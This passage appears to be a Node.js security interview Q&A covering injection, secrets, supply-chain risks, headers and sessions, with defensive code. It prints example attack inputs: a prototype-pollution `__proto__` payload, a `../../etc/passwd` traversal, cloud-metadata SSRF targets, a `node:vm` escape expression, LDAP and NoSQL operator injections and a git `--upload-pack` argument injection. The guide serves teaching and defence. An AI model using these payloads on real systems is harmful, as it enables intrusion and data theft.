Prototype pollution is when an attacker adds or changes properties on `Object.prototype` (or another shared prototype). Since almost every object inherits from it, the injected property suddenly shows up everywhere. It usually happens through unsafe deep-merge or "set by path" functions that accept keys like `__proto__` or `constructor`.

## 56: Show a simple example of prototype pollution.

```js
function merge(target, source) {
  for (const key in source) {
    if (typeof source[key] === "object" && source[key] !== null) {
      target[key] ??= {};
      merge(target[key], source[key]);
    } else {
      target[key] = source[key];
    }
  }
  return target;
}

const payload = JSON.parse('{"__proto__": {"isAdmin": true}}');
merge({}, payload);

console.log({}.isAdmin); // true, every object is now "admin"
```

## 57: What is path traversal?

Path traversal (directory traversal) is when an attacker uses `../` in a file name to reach files outside the folder you meant to serve. For example, `GET /files?name=../../etc/passwd`. In Node.js, it often happens when you pass user input straight to `fs.readFile` or `path.join`.

## 58: What are the basic rules for secure file uploads?

- Limit the file size and number of files.
- Check the real file type (magic bytes), not just the extension or `Content-Type`.
- Allow only the types you need.
- Generate your own random file name; never use the user's name as a path.
- Store files outside the web root, or in object storage like S3.
- Serve them with `Content-Disposition: attachment` and `nosniff` when possible.

## 59: What is SSRF?

Server-side request forgery is when an attacker makes your server send HTTP requests to a place they choose. For example, an "import from URL" feature could be pointed at `http://169.254.169.254/` to read cloud credentials, or at internal services like `http://localhost:6379`. Your server becomes a proxy into your private network.

## 60: What is insecure deserialization?

It is turning untrusted data back into objects in a way that can run code or create unexpected object types. In Node.js, the well-known case is the `node-serialize` package, which could run functions embedded in the data. `JSON.parse` itself is safe because it only creates plain data, but the result still needs validation.

## 61: Why is eval dangerous?

`eval` runs a string as JavaScript with full access to your process. If any user input reaches it, an attacker can read files, steal secrets or run shell commands. The same goes for `new Function(...)`, `setTimeout` with a string, and `vm.runInThisContext`. There is almost always a safer way, like `JSON.parse` or a lookup table.

## 62: Is the node:vm module a security sandbox?

No. The Node.js docs state clearly that `node:vm` is not a security mechanism and must not be used to run untrusted code. Code inside a vm context can escape to the host through the objects you pass in, for example by reaching `this.constructor.constructor('return process')()`.

## 63: What is the difference between exec and execFile in child_process?

`exec` runs the command through a shell (`/bin/sh` or `cmd.exe`), so characters like `;`, `|`, `&&` and `$()` are interpreted. `execFile` runs the program directly with an array of arguments and no shell, so those characters are passed as plain text. Use `execFile` or `spawn` without `shell: true` when any argument comes from users.

```js
import { execFile } from "node:child_process";

execFile("ping", ["-c", "1", host], (err, stdout) => {
  // host is a single argument, not shell code
});
```

## 64: Where should secrets like API keys and DB passwords live?

Not in source code and not in git. In development, put them in a `.env` file that is git-ignored. In production, use a secrets manager (AWS Secrets Manager, Google Secret Manager, Azure Key Vault, HashiCorp Vault) or the secret store of your platform, and pass them to the app as environment variables or mounted files.

## 65: How do you load a .env file in modern Node.js without dotenv?

Node.js has built-in support:

```bash
node --env-file=.env server.js
node --env-file-if-exists=.env.local server.js
```

Or from code:

```js
process.loadEnvFile(".env");
console.log(process.env.DATABASE_URL);
```

The `dotenv` package still works, but it is no longer needed for the basic case.

## 66: Why should .env files never be committed?

Anything pushed to git stays in the history, even if you delete it later, and it is copied to every clone, fork and CI runner. Public repos are scanned by bots within minutes for leaked keys. Add `.env` to `.gitignore`, commit a `.env.example` with fake values instead, and rotate any key that was ever pushed.

## 67: What is the node:crypto module used for?

It is Node's built-in module for cryptography. It covers hashing (`createHash`), HMAC (`createHmac`), encryption (`createCipheriv`), random values (`randomBytes`, `randomUUID`, `randomInt`), key generation, signatures, password-based key derivation (`scrypt`, `pbkdf2`) and timing-safe comparison. It also exposes the standard Web Crypto API as `crypto.subtle`.

## 68: Why is Math.random() not safe for tokens?

`Math.random()` is not cryptographically secure. Its output can be predicted after seeing enough values. For session IDs, reset tokens, API keys and anything else secret, use `crypto.randomBytes`, `crypto.randomUUID` or `crypto.getRandomValues`.

```js
import { randomBytes } from "node:crypto";
const token = randomBytes(32).toString("base64url");
```

## 69: What is the difference between hashing and encryption?

Hashing is one-way: you cannot get the original data back from a hash. It is used for passwords and integrity checks. Encryption is two-way: with the right key, you can decrypt the data. It is used for data you need to read again, like stored card tokens or messages.

## 70: What is HMAC?

A hash-based message authentication code combines a secret key with a hash function. It proves that a message was created by someone who knows the key and was not changed. It is used for webhook signatures, signed cookies and HS256 JWTs.

```js
import { createHmac } from "node:crypto";

const signature = createHmac("sha256", process.env.WEBHOOK_SECRET)
  .update(rawBody)
  .digest("hex");
```

## 71: What is a timing attack?

A timing attack measures how long a comparison takes to learn about a secret. A normal string compare (`===`) can stop at the first different character, so a guess with more correct leading characters takes slightly longer. Over many requests, an attacker could recover a token one character at a time.

## 72: How do you compare secrets safely in Node.js?

Use `crypto.timingSafeEqual`, which always takes the same time for buffers of the same length.

```js
import { timingSafeEqual } from "node:crypto";

function safeEqual(a, b) {
  const bufA = Buffer.from(a);
  const bufB = Buffer.from(b);
  if (bufA.length !== bufB.length) return false;
  return timingSafeEqual(bufA, bufB);
}
```

`timingSafeEqual` throws if the lengths differ, so check length first (or compare HMACs of both values, which always have equal length).

## 73: Why does a Node.js app need HTTPS?

Without HTTPS, everything between the client and server travels in plain text. Anyone on the network path can read passwords, cookies and tokens, or change the response. HTTPS (HTTP over TLS) encrypts the traffic and proves the server's identity with a certificate.

## 74: Do you usually terminate TLS inside Node.js?

Usually not. In most production setups, a load balancer, reverse proxy (Nginx, Caddy, Envoy) or CDN terminates TLS and forwards traffic to Node.js over a private network. Node.js can serve HTTPS directly with `node:https`, which is fine for small setups or for end-to-end encryption inside the network.

## 75: What does npm audit do?

`npm audit` checks your installed dependency tree against the GitHub Advisory Database and lists packages with known vulnerabilities, their severity and fixed versions. `npm audit fix` updates to safe versions where it can do so without breaking semver ranges.

```bash
npm audit --omit=dev
npm audit fix
```

## 76: What is a lockfile and why does it matter for security?

`package-lock.json` (or `pnpm-lock.yaml`, `yarn.lock`) records the exact version and integrity hash of every installed package. It makes installs repeatable, so a new malicious version cannot slip in silently between builds. Always commit it, and use `npm ci` in CI so the install fails if the lockfile and `package.json` disagree.

## 77: What is the difference between npm install and npm ci?

`npm install` can update the lockfile when versions in `package.json` allow it. `npm ci` deletes `node_modules`, installs exactly what the lockfile says and fails if the lockfile is out of sync. Use `npm ci` in CI and Docker builds for repeatable and safer installs.

## 78: What is typosquatting?

Attackers publish packages with names close to popular ones, like `expres`, `lodahs` or `cross-env.js`, hoping someone mistypes an install command. The fake package often works like the real one but also steals environment variables or installs malware. Check names carefully and look at download counts, the repo link and the publisher before adding a package.

## 79: What are npm install scripts and why are they risky?

Packages can define `preinstall`, `install` and `postinstall` scripts that run automatically on `npm install`. They run with your user's rights, so a malicious or hijacked package can steal SSH keys, tokens and environment variables the moment it is installed, before you even run your code. Many supply chain attacks use exactly this.

## 80: What is an SBOM?

A software bill of materials is a list of every component in your software, with names, versions and licenses. It helps you quickly answer "are we affected?" when a new vulnerability is announced. npm can generate one:

```bash
npm sbom --sbom-format cyclonedx > sbom.json
```

SPDX is the other common format (`--sbom-format spdx`).

## 81: What is the Node.js permission model?

It is a built-in feature that restricts what a Node.js process can access. You turn it on with the `--permission` flag, and then file system reads and writes, child processes, worker threads, native addons and WASI are denied unless you allow them with flags. It is stable in current LTS versions.

```bash
node --permission --allow-fs-read=/app --allow-fs-write=/app/tmp server.js
```

## 82: What happens when code tries to do something the permission model does not allow?

Node.js throws an error with the code `ERR_ACCESS_DENIED`, including which permission was missing and for which resource. You can also check ahead of time with `process.permission.has()`.

```js
if (!process.permission.has("fs.write", "/app/uploads")) {
  console.error("No write access to uploads");
}
```

## 83: Why should error messages not show stack traces to users?

Stack traces reveal file paths, library names and versions, query text and sometimes data. Attackers use this to find known bugs and plan attacks. Log the full error on the server, and send the user a generic message with a request ID they can quote to support.

## 84: What should you never write to logs?

Passwords, session IDs, access and refresh tokens, API keys, full card numbers, CVV codes, private keys and, depending on your rules, personal data like ID numbers or health data. Logs are often kept for a long time and read by many people and tools, so a secret in a log is a leaked secret.

## 85: How do you hide sensitive fields in logs with pino?

Use the `redact` option:

```js
import pino from "pino";

const logger = pino({
  redact: {
    paths: [
      "req.headers.authorization",
      "req.headers.cookie",
      "password",
      "*.token",
    ],
    censor: "[REDACTED]",
  },
});

logger.info({ password: "hunter2", user: "ana" }, "login");
// {"password":"[REDACTED]","user":"ana",...}
```

## 86: What is security logging and monitoring?

It means recording security-relevant events (logins, failed logins, password changes, permission errors, admin actions, input validation failures) and watching them for signs of attack. Without it, breaches go unnoticed for months. "Security Logging and Alerting Failures" is in the OWASP Top 10:2025 for this reason.

## 87: What is a WebSocket and why does it need its own security checks?

A WebSocket is a long-lived, two-way connection between browser and server. After the HTTP upgrade, normal HTTP middleware (auth, CSRF, rate limits) no longer runs on each message. You must check auth and the `Origin` header at connection time, validate every message, limit message size and rate, and close idle or abusive connections.

## 88: What is GraphQL introspection and should it be on in production?

Introspection lets clients ask a GraphQL server for its full schema: every type, field and argument. It is very useful in development, but in production it gives attackers a full map of your API. Most teams turn it off for public APIs, though it is not a real security control by itself, since field names can often be guessed.

## 89: Why should a Node.js container not run as root?

If an attacker gets code execution in the app, they get the same user rights. As root, they can install tools, change system files and have a better chance of escaping the container. The official `node` images include a `node` user, so you can switch to it with `USER node` in the Dockerfile.

## 90: Why should you use a small base image for Node.js containers?

Fewer packages mean fewer vulnerabilities to patch and fewer tools for an attacker to use. Slim or distroless images often do not even have a shell or package manager. Common choices are `node:24-slim`, `node:24-alpine` and Google's distroless Node.js images.

## 91: What is SAST?

Static application security testing analyzes source code without running it, looking for patterns like SQL built with string concatenation, `eval` on user input or hardcoded secrets. Tools for Node.js include Semgrep, CodeQL, SonarQube and `eslint-plugin-security`. It runs early, often on every pull request.

## 92: What is DAST?

Dynamic application security testing attacks a running app from the outside, like a real attacker would, by sending crafted requests and looking at the responses. OWASP ZAP and Burp Suite are common tools. It finds problems that only show up at runtime, such as missing headers, misconfigured CORS or injection in a real endpoint.

## 93: What is fuzzing?

Fuzzing feeds a program large amounts of random or mutated input to find crashes, hangs and unexpected behavior. It is good at finding parser bugs, ReDoS and unhandled edge cases. For JavaScript, you can use coverage-guided fuzzers such as Jazzer.js, or property-based testing with `fast-check`.

## 94: What is a CVE?

A Common Vulnerabilities and Exposures ID is a unique name for a publicly known vulnerability, like `CVE-2026-21636`. It lets everyone (vendors, scanners, advisories) refer to the same issue. Tools like `npm audit` map package versions to CVEs and GitHub advisories.

## 95: What is a security release in Node.js?

It is a Node.js release that fixes one or more vulnerabilities in the runtime itself. The Node.js team announces upcoming security releases in advance on the nodejs.org blog, with the affected release lines and the highest severity, then publishes patched versions for all supported lines at the same time. You should upgrade quickly when they come out.

## 96: Why should you only use supported Node.js versions in production?

Only Current and LTS versions get security fixes. Once a version reaches end of life, new vulnerabilities in it are never fixed, and many scanners will flag it. Run an LTS version and plan upgrades before the end-of-life date.

## 97: What does the principle of least privilege mean?

Every user, service, process and token should have only the access it needs, and nothing more. For a Node.js app, that means a database user that cannot drop tables, a container that is not root, cloud credentials scoped to one bucket, and API keys limited to the endpoints they need. If something is compromised, the damage stays small.

## 98: What is defense in depth?

It means using several layers of protection so one failure does not lead to a breach. For XSS, you would escape output, sanitize rich text, set a strict CSP and use `HttpOnly` cookies. If one layer has a bug, the others still help.

## 99: What is the difference between 401 and 403?

`401 Unauthorized` means the request has no valid authentication: the user is not logged in or the token is missing or expired. `403 Forbidden` means the user is known but is not allowed to do this action. Some APIs return `404` instead of `403` to avoid revealing that a resource exists.

## 100: What does the X-Powered-By header reveal and why remove it?

Express sends `X-Powered-By: Express` by default. It tells attackers which framework you use, which helps them pick known attacks. It is a small thing, but there is no reason to send it. Helmet removes it, or you can do it yourself:

```js
app.disable("x-powered-by");
```

## 101: What is OAuth 2.0?

OAuth 2.0 is a standard for delegated authorization. It lets a user give an app limited access to their data on another service without sharing their password. For example, a calendar app can get an access token to read your Google Calendar. OAuth itself is about access, not about telling the app who you are.

## 102: What is OpenID Connect?

OpenID Connect (OIDC) is a layer on top of OAuth 2.0 that adds login. Besides the access token, the provider returns an ID token, which is a JWT with claims about the user (`sub`, `email`, `name`). "Sign in with Google" and most company single sign-on systems use OIDC.

## 103: What is the difference between an access token and a refresh token?

An access token is short-lived (minutes) and sent with each API request. A refresh token lives longer (days or weeks) and is used only to get a new access token when the old one expires. Keeping access tokens short limits the damage if one leaks, and the refresh token can be revoked on the server.

## 104: What is multi-factor authentication?

MFA requires two or more kinds of proof: something you know (password), something you have (phone, security key) and something you are (fingerprint). Even if a password is stolen, the attacker still needs the second factor. Common second factors are TOTP apps, passkeys and hardware keys. SMS codes are weaker because of SIM swapping.

## 105: What are passkeys?

Passkeys are a password replacement based on the WebAuthn standard. The device creates a key pair for each site, keeps the private key, and signs a challenge from the server at login. They cannot be phished, because the browser only uses them on the right domain, and there is no shared secret on the server to steal. In Node.js, `@simplewebauthn/server` is a common library for them.

## 106: What is LDAP injection?

LDAP injection happens when user input is put into an LDAP search filter without escaping. For example, a username of `*)(uid=*))(|(uid=*` can change the filter and log the attacker in as any user. The fix is to escape special characters (`*`, `(`, `)`, `\`, NUL) in filter values and validate input strictly. LDAP libraries such as `ldapts` provide filter classes that escape values for you.

## 107: Why should you limit the size of request bodies?

Without a limit, an attacker can send a huge body that uses a lot of memory and CPU to parse, and a few such requests can crash or freeze the server. Express's `express.json()` has a default limit of 100 KB, which you can lower or raise per route.

```js
app.use(express.json({ limit: "20kb" }));
```

## 108: What does app.set('trust proxy') do in Express and why does it matter for security?

Behind a load balancer, `req.ip` would always be the proxy's address. With `trust proxy` set, Express reads the client IP from `X-Forwarded-For`. Set it to the exact number of proxies (for example `1`) or their addresses. If you set it to `true` without a proxy, anyone can fake their IP by sending that header, which breaks rate limiting and logging.

## 109: What is an open redirect?

It is an endpoint that redirects to any URL given in a parameter, like `/login?next=https://evil.com`. Attackers use your trusted domain in phishing links to send users to a fake site. Allow only relative paths or a list of known hosts.

```js
const next = req.query.next;
const safe =
  typeof next === "string" && next.startsWith("/") && !next.startsWith("//")
    ? next
    : "/";
res.redirect(safe);
```

## 110: What is mass assignment?

Mass assignment happens when you pass the whole request body into a database create or update call. An attacker can add fields you did not expect, like `"role": "admin"` or `"balance": 99999`. Pick only the allowed fields, or validate with a strict schema that rejects unknown keys.

```js
const { name, bio } = req.body;
await db.user.update({ where: { id: req.user.id }, data: { name, bio } });
```

## 111: What is account enumeration?

It is when an attacker can find out whether an account exists. For example, the login page says "user not found" for one email and "wrong password" for another, or "forgot password" responds differently. Return the same message and similar timing for both cases, like "If that email is registered, we sent a link."

## 112: How should a password reset token be created?

- Generate it with `crypto.randomBytes(32)`.
- Store only a hash of it (for example SHA-256) in the database.
- Make it expire after a short time, like 15 to 60 minutes.
- Make it single-use and delete it after use.
- Invalidate existing sessions after the password changes.

## 113: Why should logout destroy the session on the server?

If logout only deletes the cookie in the browser, a stolen session ID still works until it expires. Calling `req.session.destroy()` (or deleting the record in Redis) makes the ID useless right away.

```js
app.post("/logout", (req, res, next) => {
  req.session.destroy((err) => {
    if (err) return next(err);
    res.clearCookie("sid");
    res.sendStatus(204);
  });
});
```

## 114: What is session fixation?

The attacker gets a victim to use a session ID the attacker already knows (for example, through a link or a cookie set from a subdomain). After the victim logs in, the attacker uses the same ID and is logged in too. The fix is to create a new session ID at login.

## 115: What does NODE_ENV=production change that affects security?

Many libraries behave differently in production mode. Express's default error handler stops sending stack traces, template engines enable caching, and some libraries turn off debug output. It is not a security control by itself, but forgetting it can leak internal details in error pages.

## 116: Why is exposing the Node.js inspector port dangerous?

Running with `--inspect=0.0.0.0:9229` lets anyone who can reach that port attach a debugger and run any code in your process. Never enable the inspector in production. If you must debug, bind it to `127.0.0.1` and reach it through an SSH tunnel.

## 117: What is a referrer policy?

The `Referrer-Policy` header controls how much of the current URL the browser sends in the `Referer` header when users follow links or load resources. Full URLs can leak tokens or private paths to other sites. `strict-origin-when-cross-origin` or `no-referrer` are safe choices. Helmet sets `no-referrer` by default.

## 118: What is the Permissions-Policy header?

It tells the browser which features (camera, microphone, geolocation, payment and so on) the page and its iframes may use. Turning off features you do not use reduces what an XSS bug or a third-party script can do.

```
Permissions-Policy: camera=(), microphone=(), geolocation=()
```

## 119: How do you sanitize user-supplied HTML in Node.js?

Use a well-tested HTML sanitizer with an allowlist of tags and attributes, such as `sanitize-html` or DOMPurify (with `jsdom` on the server). Never try to clean HTML with your own regex.

```js
import sanitizeHtml from "sanitize-html";

const clean = sanitizeHtml(req.body.comment, {
  allowedTags: ["b", "i", "em", "strong", "a", "p"],
  allowedAttributes: { a: ["href"] },
  allowedSchemes: ["https", "mailto"],
});
```

## 120: What is server-side template injection?

It happens when user input is used as the template itself instead of as data passed to the template. For example, compiling `'Hello ' + req.query.name` with a template engine lets the attacker run template expressions, which can lead to code execution. Always pass user input as variables to a fixed template.

## 121: How does express.static handle dotfiles?

By default, `express.static` ignores dotfiles (`dotfiles: 'ignore'`), so a request for `/.env` gets a 404 instead of the file. Still, never put secrets, `.git` folders or source code inside the folder you serve as static.

```js
app.use(express.static("public", { dotfiles: "deny", index: false }));
```

## 122: Why should you not ship source maps publicly from a Node.js-built front end?

Source maps let anyone rebuild your original source, including comments, internal API paths and sometimes keys that should not have been in the bundle. Upload them to your error tracker instead of serving them, or restrict access to them.

## 123: What is NODE_TLS_REJECT_UNAUTHORIZED=0 and why is it dangerous?

Setting it to `0` turns off TLS certificate checking for every HTTPS request the process makes. Anyone in the middle can then pretend to be your database, payment API or identity provider. Node.js prints a warning when it is set. Fix the real certificate problem instead, for example with `NODE_EXTRA_CA_CERTS` for a private CA.

## 124: What is Subresource Integrity?

SRI is an `integrity` attribute on `<script>` and `<link>` tags with a hash of the expected file. If a CDN is hacked and the file changes, the browser refuses to load it. It is useful when your Node.js server renders pages that load third-party scripts.

```html
<script
  src="https://cdn.example.com/lib.js"
  integrity="sha384-..."
  crossorigin="anonymous"
></script>
```

## 125: Why should you avoid JSONP?

JSONP loads data through a `<script>` tag and a callback function. It bypasses the same-origin policy, cannot use proper auth headers and lets the remote server run any script on your page. CORS replaced it. If an old endpoint still supports a `callback` parameter, it can also be abused for XSS and to bypass CSP.

## 126: What is a threat model?

A threat model is a structured look at what you are building, what can go wrong and what you will do about it. You list assets (user data, payments), entry points (APIs, uploads, webhooks), likely attackers and their goals, then the controls for each threat. STRIDE is a common checklist for this.

## 127: What is the purpose of a SECURITY.md file?

It tells people how to report a security problem in your project privately, which versions get fixes and how long you take to respond. GitHub shows it in the repo's Security tab. Without it, researchers may open a public issue that exposes the bug before it is fixed.

## 128: What is responsible disclosure?

It is the practice of reporting a vulnerability privately to the vendor and giving them time to fix it before publishing details. Node.js itself runs a bug bounty program on HackerOne and asks reporters to use it instead of public issues.

## 129: Why should you keep dependencies updated?

Most vulnerabilities in Node.js apps come from dependencies, not your own code. Old versions keep known bugs that attackers can easily look up. Tools like Dependabot and Renovate open pull requests for updates, and `npm outdated` shows what is behind.

## 130: What is Dependabot?

Dependabot is a GitHub feature that watches your dependencies. It sends alerts when a package you use has a known vulnerability, can open pull requests that update it, and can also keep versions current on a schedule. Renovate is a popular alternative with more configuration options.

## 131: What is a webhook signature and why verify it?

When a service like Stripe or GitHub calls your webhook, it signs the request body with a shared secret (usually HMAC-SHA256) and sends the signature in a header. Your server recomputes the signature over the raw body and compares it with `timingSafeEqual`. Without this, anyone could send fake events like "payment succeeded."

## 132: Why do you need the raw body to verify a webhook signature?

The signature is computed over the exact bytes the sender sent. If you parse the JSON and stringify it again, spacing or key order can change and the signature will not match. In Express, use `express.raw()` on the webhook route.

```js
app.post(
  "/webhooks/stripe",
  express.raw({ type: "application/json" }),
  (req, res) => {
    const rawBody = req.body; // Buffer
    // verify signature over rawBody, then JSON.parse(rawBody)
    res.sendStatus(200);
  },
);
```

## 133: What is an API key and how should it be stored on the server?

An API key is a long random string that identifies a client calling your API. Treat it like a password: generate it with `randomBytes`, show it to the user only once, and store only a hash (SHA-256 is fine here because the key is long and random). Add a short visible prefix so leaked keys are easy to spot and revoke.

## 134: What does "fail securely" mean?

When something goes wrong, the app should end up in a safe state. If the permission check throws an error, the request should be denied, not allowed. If the auth service is down, users should not be let in without checks. "Mishandling of Exceptional Conditions" is in the OWASP Top 10:2025 for this reason.

## 135: What happens to an unhandled promise rejection in modern Node.js?

Since Node.js 15, an unhandled rejection is treated like an uncaught exception: Node prints the error and exits with a non-zero code. This is safer than ignoring it, because the app does not keep running in an unknown state. Run under a process manager or orchestrator that restarts it.

## 136: Should you keep the process running after an uncaughtException?

No. After an uncaught exception, the app may be in a broken state (half-written data, held locks, leaked connections). Log the error, try to close the server gracefully, then exit and let your process manager start a fresh process.

```js
process.on("uncaughtException", (err) => {
  logger.fatal({ err }, "uncaught exception");
  process.exit(1);
});
```

## 137: How do you add HTTP request timeouts in a Node.js server?

The `http.Server` has timeouts you can set: `requestTimeout` (whole request, default 300 seconds), `headersTimeout` (time to receive headers) and `keepAliveTimeout`. Short timeouts stop slow clients from holding connections open forever.

```js
const server = app.listen(3000);
server.requestTimeout = 30_000;
server.headersTimeout = 10_000;
server.keepAliveTimeout = 5_000;
```

## 138: What is a Slowloris attack?

Slowloris opens many connections and sends request headers very slowly, a few bytes at a time, so each connection stays open. The server runs out of sockets or memory for real users. Header and request timeouts, connection limits and a reverse proxy in front of Node.js all help.

## 139: Why should health and debug endpoints be protected?

Endpoints like `/health`, `/metrics`, `/debug` or `/admin` often show versions, configuration, internal hostnames or allow actions like flushing caches. If they are public, attackers learn about your system or abuse them. Keep detailed ones on an internal port or network, and require auth for anything beyond a simple "OK."

## 140: What is two-factor authentication on the npm registry and why use it?

npm accounts can require a second factor for login and publishing. If a maintainer's password or token is stolen, the attacker still cannot publish a malicious version. Popular packages have been hijacked through stolen maintainer accounts, so maintainers should turn on 2FA (preferably with a security key) and avoid long-lived publish tokens.

## 141: What is npm provenance?

Provenance is a signed statement, published with a package, that says which source repo and CI build produced it. It is created when you publish from a supported CI system (for example GitHub Actions) with `npm publish --provenance` or through trusted publishing. Users can check it with `npm audit signatures` and on the npm website.

## 142: What is the risk of putting an npm token in .npmrc in a repo?

A token in a committed `.npmrc` lets anyone who sees the repo publish packages as you or download your private packages. Use an environment variable reference instead, and prefer short-lived tokens or OIDC trusted publishing in CI.

```
//registry.npmjs.org/:_authToken=${NPM_TOKEN}
```

## 143: What is a CAPTCHA and when should you use it?

A CAPTCHA is a challenge meant to tell humans and bots apart. It helps on signup, login after several failures, contact forms and password reset, where bots cause abuse. Modern options like Cloudflare Turnstile or reCAPTCHA v3 are mostly invisible. Always verify the CAPTCHA token on the server.

## 144: How should user IDs be generated in public URLs?

Sequential IDs like `/users/1042` reveal how many users you have and make guessing other IDs easy. Random IDs like UUIDs (`crypto.randomUUID()`) or UUIDv7 are harder to guess. This does not replace authorization checks, but it reduces scraping and enumeration.

## 145: What is the same-origin policy?

It is a browser rule that a page from one origin (scheme + host + port) cannot read data from another origin. Without it, any site you visit could read your email from another tab. CORS is the controlled way to relax it, and many web attacks (CSRF, XSS) are about getting around it.

## 146: What is HTTPS redirection and how do you do it behind a proxy?

It sends users who come over plain HTTP to the HTTPS version of the URL. Behind a proxy that terminates TLS, Node.js sees all traffic as HTTP, so check `req.secure` with `trust proxy` set, or the `X-Forwarded-Proto` header from your trusted proxy. Usually it is simpler to do the redirect in the proxy or load balancer itself.

## 147: What are security misconfigurations in a typical Node.js app?

- Debug mode or stack traces in production.
- Default or weak secrets (`secret: 'keyboard cat'`).
- CORS open to every origin with credentials.
- Missing security headers.
- Admin panels or databases exposed to the internet.
- Overly broad cloud IAM roles.

It is number two in the OWASP Top 10:2025.

## 148: Why should the session secret be long and random?

`express-session` and `cookie-parser` use the secret to sign cookies. A short or default secret can be guessed or brute-forced, and then an attacker can create valid signed cookies. Generate it with `crypto.randomBytes(32)`, keep it in a secrets store and rotate it when needed.

## 149: What is an incident response plan?

It is a written plan for what the team does when a security incident happens: who leads, who to contact, how to contain the problem, how to collect evidence, how to fix and recover, and how to tell users or regulators. Having it ready before an incident saves time and avoids panic.

## 150: What should you do first if a secret is leaked in a public repo?

Rotate it right away: revoke the old key and create a new one. Removing the commit is not enough, because bots copy leaked secrets within minutes. Then check logs for misuse, clean the git history if needed, and add secret scanning (GitHub push protection, gitleaks) so it does not happen again.

# Moderate Questions (151-300)

## 151: How do you write a reusable validation middleware for Express with Zod?

```js
import { z } from "zod";

export const validate = (schemas) => (req, res, next) => {
  for (const part of ["body", "params", "query"]) {
    if (!schemas[part]) continue;
    const result = schemas[part].safeParse(req[part]);
    if (!result.success) {
      return res
        .status(400)
        .json({ error: "Invalid input", issues: z.flattenError(result.error) });
    }
    req.valid ??= {};
    req.valid[part] = result.data;
  }
  next();
};

app.get(
  "/users/:id",
  validate({ params: z.object({ id: z.uuid() }) }),
  (req, res) => res.json({ id: req.valid.params.id }),
);
```

Storing the parsed result on `req.valid` matters in Express 5, where `req.query` is a getter and cannot be reassigned. Handlers then use only the checked data.

## 152: Why do query string values need type coercion during validation?

Everything in the query string arrives as a string (or an array or object, depending on the parser). `?limit=10` gives `"10"`, not `10`. Use coercion in your schema, like `z.coerce.number().int().min(1).max(100)`, so you get a real number with limits, instead of trusting `Number(req.query.limit)` that might be `NaN` or huge.

## 153: How did Express 5's query parser change help against NoSQL injection?

Express 4 used the `qs` "extended" parser by default, so `?user[$ne]=x` turned into `{ user: { $ne: 'x' } }`. Express 5 defaults to the "simple" parser (Node's `querystring`), which only produces strings and arrays of strings. That removes one easy path for operator injection through the query string, but JSON bodies can still contain objects, so you still need validation.

## 154: How do you protect Mongoose queries from operator injection?

- Validate types: a field that should be a string must be a string.
- Turn on `sanitizeFilter`, which wraps any key starting with `$` in a filter with `$eq` so it is matched literally.
- Keep `strictQuery` on so unknown fields are dropped from filters.

```js
mongoose.set("sanitizeFilter", true);

// {"email": {"$ne": null}} becomes { email: { $eq: { $ne: null } } }
await User.findOne({ email: req.body.email });
```

If you really need an operator from your own code, wrap it with `mongoose.trusted()`.

## 155: Why does express-mongo-sanitize not work well with Express 5?

It works by changing `req.query` in place, but in Express 5 `req.query` is a getter that is re-parsed on each access, so the changes do not stick and some versions throw an error. With Express 5, validate input with a schema (Zod, Joi, Valibot) and use driver or ODM options like Mongoose's `sanitizeFilter` instead.

## 156: How do you safely use dynamic column names or sort order in SQL?

Placeholders work only for values, not for identifiers like table names, column names or `ASC`/`DESC`. Map user input to a fixed list of allowed values.

```js
const SORT_COLUMNS = {
  name: "name",
  created: "created_at",
  price: "price_cents",
};
const column = SORT_COLUMNS[req.query.sort] ?? "created_at";
const direction = req.query.dir === "asc" ? "ASC" : "DESC";

const { rows } = await pool.query(
  `SELECT id, name FROM products ORDER BY ${column} ${direction} LIMIT $1`,
  [limit],
);
```

The only things inserted into the string are values you wrote yourself.

## 157: What is the difference between $queryRaw and $queryRawUnsafe in Prisma?

`$queryRaw` is a tagged template: values inside `${}` are sent as parameters, so it is safe. `$queryRawUnsafe` takes a plain string, so if you build that string with user input, you get SQL injection.

```js
// Safe: email becomes a parameter
await prisma.$queryRaw`SELECT * FROM "User" WHERE email = ${email}`;

// Unsafe if email comes from the user
await prisma.$queryRawUnsafe(`SELECT * FROM "User" WHERE email = '${email}'`);
```

## 158: How do you use raw SQL safely in Knex?

Pass values as bindings instead of building the string:

```js
await knex.raw("SELECT * FROM users WHERE email = ?", [email]);

// For identifiers, use ?? which Knex quotes as an identifier
await knex.raw("SELECT ?? FROM users", ["email"]);
```

Still, validate identifiers against an allowlist, because quoting does not stop a user from choosing a column you did not want exposed.

## 159: What is second-order SQL injection?

The malicious input is stored safely first, for example a username of `admin'--`. Later, another part of the app reads that value from the database and puts it into a query with string concatenation, assuming database data is trusted. Treat data from your own database as untrusted when building queries, and always use parameters.

## 160: Why do LIKE queries need extra escaping even with parameters?

Parameters stop SQL injection, but `%` and `_` are still wildcards inside a LIKE pattern. A search for `%` would match every row and could make the query slow on large tables. Escape them if you want literal matches:

```js
const term = search.replace(/[\\%_]/g, (c) => "\\" + c);
await pool.query("SELECT * FROM items WHERE name LIKE $1 ESCAPE '\\'", [
  `%${term}%`,
]);
```

## 161: What is argument injection in child_process calls?

Even without a shell, a user value that starts with `-` can be read as an option by the program. For example, `execFile('git', ['clone', userUrl])` with `userUrl = '--upload-pack=touch /tmp/pwned'` runs a command. Validate the value and put `--` before user arguments where the program supports it, so everything after is treated as a plain argument.

```js
execFile("git", ["clone", "--", repoUrl, targetDir]);
```

## 162: What changed about spawn with shell: true in recent Node.js versions?

Passing an argument array together with `shell: true` is deprecated (DEP0190, runtime warning in Node.js 24). Node.js just joins the arguments with spaces and hands them to the shell without escaping, which gives a false sense of safety. If you need a shell, pass one full command string you built from trusted parts; otherwise drop `shell: true` and pass the array.

## 163: How do you set up a CSP with nonces in Express?

Generate a new random nonce per request, put it in the CSP header and add it to your allowed inline `<script>` tags.

```js
import crypto from "node:crypto";
import helmet from "helmet";

app.use((req, res, next) => {
  res.locals.cspNonce = crypto.randomBytes(16).toString("base64");
  next();
});

app.use(
  helmet({
    contentSecurityPolicy: {
      directives: {
        scriptSrc: ["'self'", (req, res) => `'nonce-${res.locals.cspNonce}'`],
        objectSrc: ["'none'"],
        baseUri: ["'none'"],
      },
    },
  }),
);
```

In the template: `<script nonce="<%= cspNonce %>">...</script>`. Injected scripts will not have the right nonce, so the browser blocks them.

## 164: What is Content-Security-Policy-Report-Only used for?

It applies the policy in "watch mode": the browser does not block anything, but it reports what would have been blocked to your reporting endpoint. You use it to roll out a new or stricter CSP without breaking the site, fix the violations, then switch to the enforcing header.

## 165: How do you receive CSP violation reports in Node.js?

